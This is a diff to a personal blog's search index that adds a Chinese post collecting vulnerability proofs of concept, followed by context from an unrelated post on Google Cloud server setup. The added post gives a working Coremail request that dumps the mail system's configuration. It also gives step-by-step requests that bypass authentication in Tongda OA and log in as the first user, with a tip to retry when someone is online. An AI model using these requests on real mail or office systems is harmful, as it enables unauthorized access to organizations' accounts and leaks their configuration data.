@@ -1,6 +1,27 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>漏洞类型积累</title>
+    <url>/2021/03/08/%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B%E7%A7%AF%E7%B4%AF/</url>
+    <content><![CDATA[<blockquote class="blockquote-center">
+            <i class="fa fa-quote-left"></i>
+            <p>这里记录一下遇到的漏洞及poc</p>
+
+            <i class="fa fa-quote-right"></i>
+          </blockquote>
+
+<span id="more"></span>
+
+<h3 id="Coremail邮件系统配置文件信息泄露"><a href="#Coremail邮件系统配置文件信息泄露" class="headerlink" title="Coremail邮件系统配置文件信息泄露"></a>Coremail邮件系统配置文件信息泄露</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;x.x.x.x&#x2F;mailsms&#x2F;s?func&#x3D;ADMIN:appState&amp;dumpConfig&#x3D;&#x2F;</span><br></pre></td></tr></table></figure>
+
+<h3 id="通达OA未授权访问"><a href="#通达OA未授权访问" class="headerlink" title="通达OA未授权访问"></a>通达OA未授权访问</h3><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">1.先访问http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0，如果出现空白，说明已经获得权限；</span><br><span class="line">2.在访问http://xxx.xxx.xxx/general/ ,成功进入系统</span><br><span class="line">3.如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录的时候在尝试</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>谷歌云机器运维</title>
     <url>/2021/03/05/%E8%B0%B7%E6%AD%8C%E4%BA%91%E6%9C%BA%E5%99%A8%E8%BF%90%E7%BB%B4/</url>
     <content><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01  前言"></a>0x01  前言</h3><p>每次白嫖谷歌云，都要重新部署服务器，此篇记录一下，日后好翻看。服务器是debain10。</p>
